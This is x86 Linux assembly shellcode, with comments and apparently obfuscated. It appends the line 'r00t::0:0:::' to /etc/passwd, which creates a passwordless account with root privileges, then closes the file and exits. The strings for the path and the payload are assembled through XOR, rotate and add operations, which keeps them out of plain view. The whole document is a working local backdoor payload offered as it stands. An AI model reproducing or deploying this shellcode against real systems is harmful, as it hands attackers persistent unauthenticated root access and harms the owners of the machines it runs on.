global _start

section .text

_start:
    ; int open(const char *pathname, int flags): syscall 0x5
    ;   fd = open("/etc//passwd", O_WRONLY | O_APPEND)
    xor ecx, ecx        ; ecx = 0
    push ecx            ; string null-termintator
    mov eax, 0x64777373 
    push eax            ; "sswd" reversed
    xor eax, 0x5075C5C
    push eax            ; "//pa" reversed
    xor eax, 0x2044A01
    inc eax
    push eax            ; "/etc" reversed
    mov ebx, esp        ; ebx = "/etc/passwd"
    mul ecx             ; eax = 0, edx = 0
    mov al, 0x5         ; eax = 5
    mov cx, 0x401       ; ecx = O_WRONLY | O_APPEND
    int 0x80            ; perform syscall
    
    ; ssize_t write(int fd, const void *buf, size_t count): syscall 0x4
    ;   write(fd, "r00t::0:0:::", 12)
    xchg eax, ebx       ; ebx = fd
    mov eax, 0x3a3a3a30
    push eax            ; "0:::" reversed
    ror eax, 16
    push eax            ; "::0:" reversed
    add eax, 0x39FFF638
    push eax            ; "r00t" reversed
    mov ecx, esp        ; ecx = "r00t::0:0:::"
    push byte 0x4
    pop eax             ; eax = 4
    mov dl, 0xc         ; edx = 12
    int 0x80            ; perform syscall
    
    ; int close(int fd): syscall 0x6
    ;   close(fd)
    shr al, 1           ; eax = 6 (eax = 12 from write return)
    int 0x80            ; perform syscall (ebx is already set)
    
    ; void _exit(int status): syscall 0x1
    ;   _exit(whatever)
    inc eax             ; eax = 1 (eax = 0 from close return)
    int 0x80            ; perform syscall

